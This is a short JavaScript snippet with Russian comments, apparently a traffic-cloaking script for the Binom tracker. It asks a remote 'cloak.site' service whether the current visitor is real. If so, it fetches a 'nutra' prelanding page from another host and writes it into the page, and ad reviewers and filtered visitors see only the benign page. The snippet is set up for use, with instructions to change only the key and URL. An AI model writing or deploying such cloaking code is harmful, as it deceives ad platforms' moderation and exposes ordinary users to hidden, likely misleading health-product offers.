var binomCampaingKey = 'qlxngowo6oug92mcczum'; /*GitHub Test, id:158. Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
var landingUrl = 'https://serd.site/landing/nutra/v5/'; /*Адрес преленда, который необходимо подгрузить*/

/* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/

var landing = landingUrl; 

var url = 'https://cloak.site/binom/?bckey='+binomCampaingKey;
var xhr = new XMLHttpRequest();
var cloakResult = 'no';

xhr.open('GET', url, false);
xhr.send();

if (xhr.status == 200) {
  cloakResult = xhr.responseText;
} 

if(cloakResult=="yes"){
var xhrLand = new XMLHttpRequest();
var landingCode = '';

xhrLand.open('GET', landing, false);
xhrLand.send();

if (xhrLand.status == 200) {
  landingCode = xhrLand.responseText;
} 

document.write(landingCode);

}
